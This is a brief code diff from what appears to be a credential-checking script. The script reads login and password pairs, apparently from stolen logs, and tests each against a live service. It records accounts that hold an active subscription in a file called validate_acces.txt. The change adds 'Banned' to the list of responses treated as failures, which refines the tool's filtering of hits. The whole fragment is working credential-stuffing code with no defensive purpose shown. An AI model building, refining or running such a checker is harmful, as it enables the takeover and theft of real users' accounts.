@@ -27,7 +27,7 @@ def main(folder_logs,log_file):
                     "Accept-Encoding": "identity",
                     "Content-Length": "86"
                 },verify=False)
-                if r.text not in ["Account not found","Subscription not found"]:
+                if r.text not in ["Account not found","Subscription not found","Banned"]:
                     print(Fore.GREEN + f"[Account with subscription was found] {login}:{password} - {r.text}")
 
                     with open("validate_acces.txt","a",encoding="utf-8") as validate:
